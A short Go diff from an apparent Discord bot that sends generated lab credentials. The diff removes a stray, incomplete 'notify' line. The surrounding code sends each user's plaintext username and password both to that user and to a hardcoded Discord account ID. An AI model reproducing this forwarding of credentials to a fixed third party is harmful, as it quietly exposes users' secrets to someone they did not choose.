@@ -186,7 +186,6 @@ func notifyUserWithKaminoElsaCredentials(s *discordgo.Session, userID, username,
         senderID := i.Member.User.ID
         notifyUserWithKaminoElsaCredentials(s, senderID, username, password)
         notifyUserWithKaminoElsaCredentials(s, "397202654469554178", username, password)
-        notify
     }
 
     return nil
